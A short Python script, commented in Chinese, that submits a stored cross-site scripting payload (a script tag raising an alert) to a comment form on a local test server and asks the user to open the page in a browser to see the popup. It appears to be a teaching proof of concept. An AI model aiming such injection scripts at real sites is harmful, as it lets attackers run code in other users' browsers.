import requests

# 提交恶意留言
post_url = "http://127.0.0.1:5000/comment"
payload = "<script>alert('Stored XSS')</script>"
data = {'content': payload}
response = requests.post(post_url, data=data)
print("提交结果：", response.status_code)

# 访问留言板查看效果（需手动在浏览器中打开）
get_url = "http://127.0.0.1:5000/comment"
print(f"请在浏览器中访问 {get_url} 查看弹窗。")